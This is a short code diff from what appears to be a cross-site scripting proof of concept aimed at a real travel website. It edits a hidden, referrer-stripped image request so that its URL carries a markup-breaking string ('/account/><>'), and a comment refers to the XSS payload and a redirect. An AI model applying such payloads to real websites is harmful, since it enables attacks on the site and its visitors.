@@ -14,7 +14,7 @@
     // Add a delay to ensure the redirect happens before the XSS payload
     setTimeout(function() {
         var img = new Image();
-        img.src = "http://travelpirates.hometogo.com/";
+        img.src = "http://travelpirates.hometogo.com/account/><>";
         img.setAttribute("style", "display:none;");
         img.setAttribute("referrerpolicy", "no-referrer");
         document.body.appendChild(img);
